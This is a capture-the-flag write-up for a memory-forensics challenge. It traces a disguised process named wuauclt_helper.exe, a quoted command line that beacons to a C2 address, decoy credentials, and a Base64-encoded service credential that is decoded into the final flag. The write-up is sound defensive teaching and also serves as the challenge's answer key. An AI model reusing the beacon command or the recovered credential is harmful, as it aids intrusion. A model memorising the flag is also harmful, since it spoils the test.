# Volatile Memories — Memory Forensics CTF Write-Up

## Challenge Information

| Category | Details |
|---|---|
| Challenge | Volatile Memories |
| Category | Digital Forensics / Memory Forensics |
| Points | 500 |
| Difficulty | Medium |
| Flag Format | `NADI{username:password}` |
| Evidence | `workstation.mem` |
| Status | Solved |

---

## Challenge Description

> A workstation was seized during an active incident response engagement while still powered on. Analysts believe the attacker had an active C2 connection and left credentials behind, but the environment is noisy, with several legitimate-looking (and outright fake) credentials scattered throughout memory, and the process behind the beacon disguised its name to blend in with normal Windows update services.
>
> Identify the real malicious process, recover the real credentials, and submit as:
>
> `NADI{username:password}`

The challenge provides a memory dump:

```text
workstation.mem
```

The objective is to:

1. Investigate the workstation's memory.
2. Identify the malicious process.
3. Identify its active C2 connection.
4. Ignore fake or decoy credentials.
5. Recover the attacker's real credentials.
6. Construct the final flag.

---

# Analysis

## 1. Initial Investigation

The provided evidence is a memory dump named:

```text
workstation.mem
```

Since the challenge specifically mentions:

- an active C2 connection,
- credentials left in memory,
- fake credentials,
- and a process pretending to be a Windows Update component,

the first objective is to search the memory for process, command-line, network, and credential-related artifacts.

During analysis, a suspicious process was discovered:

```text
wuauclt_helper.exe
```

with:

```text
PID: 4471
```

At first glance, the process name is designed to resemble the legitimate Windows Update AutoUpdate Client, commonly associated with `wuauclt.exe`.

However, the additional `_helper` component makes the process worth investigating.

---

## 2. Identifying the Malicious Process

Further inspection revealed the command line associated with the process:

```text
[CMDLINE] wuauclt_helper.exe -connect 185.220.101.47:4444 -beacon 30s -jitter 15
```

This is extremely suspicious.

The arguments reveal several important indicators:

```text
-connect 185.220.101.47:4444
-beacon 30s
-jitter 15
```

The use of the term:

```text
beacon
```

strongly suggests periodic communication with a Command-and-Control server.

The process is therefore identified as:

```text
Process: wuauclt_helper.exe
PID: 4471
```

---

## 3. Confirming the C2 Connection

The memory dump also contained a network handle associated with the suspicious process:

```text
[HANDLE] ... TCP 10.10.14.2:49212->185.220.101.47:4444 ESTABLISHED
```

This confirms an established TCP connection between the compromised workstation and:

```text
185.220.101.47:4444
```

The evidence matches the command-line arguments:

```text
-connect 185.220.101.47:4444
```

This correlation confirms that `wuauclt_helper.exe` was actively communicating with the suspected C2 infrastructure.

### Indicators of Compromise

| Indicator | Value |
|---|---|
| Malicious Process | `wuauclt_helper.exe` |
| PID | `4471` |
| C2 Address | `185.220.101.47` |
| C2 Port | `4444` |
| Beacon Interval | `30s` |
| Jitter | `15` |
| Connection State | `ESTABLISHED` |

---

## 4. Finding Credential Artifacts

The challenge description warns that the memory contains multiple legitimate-looking and fake credentials.

During analysis, credentials such as the following appeared:

```text
user=test
pass=test123
```

and:

```text
user=guest
pass=guest
```

These are obvious candidates, but they appear generic and are consistent with the challenge's warning about decoys.

Therefore, these credentials should not immediately be submitted.

Instead, the investigation should focus on data associated with the malicious process.

---

## 5. Discovering the Encoded Credential

Near the memory artifacts associated with the suspicious process, the following string was discovered:

```text
session_login_attempt(enc): c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
```

The `(enc)` label indicates that the credential is encoded.

The string:

```text
c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
```

also has the appearance of Base64.

Instead of treating the visible fake credentials as the answer, this encoded session-login artifact is a much stronger lead because of its context near the malicious process.

---

# Decoding the Credential

## 6. Base64 Decoding

The encoded value can be decoded using CyberChef.

### CyberChef Recipe

Paste:

```text
c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
```

and apply:

```text
From Base64
```

The result is:

```text
svc_backup:B@ckupAdm1n2026!
```

This follows the standard:

```text
username:password
```

format.

Therefore:

```text
Username: svc_backup
Password: B@ckupAdm1n2026!
```

---

## 7. Constructing the Flag

The challenge specifies the flag format as:

```text
NADI{username:password}
```

Substituting the recovered credentials gives:

```text
NADI{svc_backup:B@ckupAdm1n2026!}
```

---

# Flag

```text
NADI{svc_backup:B@ckupAdm1n2026!}
```

The flag was submitted successfully.

---

# Attack Timeline

The investigation can be summarized as:

```text
Memory Dump
    │
    ▼
Search Process Artifacts
    │
    ▼
wuauclt_helper.exe
PID 4471
    │
    ▼
Inspect Command Line
    │
    ├── -connect 185.220.101.47:4444
    ├── -beacon 30s
    └── -jitter 15
    │
    ▼
Inspect Network Handles
    │
    ▼
10.10.14.2:49212
        │
        ▼
185.220.101.47:4444
ESTABLISHED
    │
    ▼
Inspect Nearby Memory
    │
    ├── test:test123        ← Decoy
    ├── guest:guest         ← Decoy
    │
    └── session_login_attempt(enc)
             │
             ▼
c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
             │
             ▼
         Base64 Decode
             │
             ▼
svc_backup:B@ckupAdm1n2026!
             │
             ▼
NADI{svc_backup:B@ckupAdm1n2026!}
```

---

# Key Findings

### Malicious Process

```text
wuauclt_helper.exe
```

PID:

```text
4471
```

### C2 Infrastructure

```text
185.220.101.47:4444
```

### Malicious Command

```text
wuauclt_helper.exe -connect 185.220.101.47:4444 -beacon 30s -jitter 15
```

### Encoded Credential

```text
c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
```

### Decoded Credential

```text
svc_backup:B@ckupAdm1n2026!
```

### Final Flag

```text
NADI{svc_backup:B@ckupAdm1n2026!}
```

---

# What I Learned

This challenge demonstrates several important concepts in memory forensics.

### 1. Process Names Cannot Be Trusted

Attackers may choose process names that resemble legitimate Windows components.

In this challenge:

```text
wuauclt_helper.exe
```

was intentionally named to resemble Windows Update-related activity.

The process name alone was therefore insufficient to determine whether it was malicious.

---

### 2. Command-Line Arguments Provide Valuable Context

The command line revealed:

```text
-connect
-beacon
-jitter
```

These arguments provided much stronger evidence of C2 behavior than the filename alone.

---

### 3. Network Evidence Can Confirm Suspicious Processes

The established connection:

```text
10.10.14.2:49212 → 185.220.101.47:4444
```

correlated directly with the IP address and port supplied to the suspicious process.

Correlating process and network artifacts helped confirm the malicious activity.

---

### 4. Memory Can Contain Decoys

The challenge intentionally included credentials such as:

```text
test:test123
guest:guest
```

These demonstrate why investigators should not automatically trust the first credential-like string they discover.

Context is important.

---

### 5. Encoding Is Not Encryption

The real credential was stored as:

```text
c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
```

This was Base64 encoded rather than encrypted.

Applying:

```text
From Base64
```

revealed the plaintext immediately.

---

# Conclusion

The investigation began with a noisy workstation memory dump containing legitimate-looking processes, fake credentials, and malicious artifacts.

The suspicious process:

```text
wuauclt_helper.exe
```

was identified because its command-line parameters revealed beaconing behavior and its network handle confirmed an established connection to:

```text
185.220.101.47:4444
```

Further investigation of the relevant memory artifacts revealed a Base64-encoded login attempt:

```text
c3ZjX2JhY2t1cDpCQGNrdXBBZG0xbjIwMjYh
```

After Base64 decoding, the real credentials were recovered:

```text
svc_backup:B@ckupAdm1n2026!
```

Giving the final flag:

```text
NADI{svc_backup:B@ckupAdm1n2026!}
```

---

## Challenge Solved

**Flag:**

```text
NADI{svc_backup:B@ckupAdm1n2026!}
```
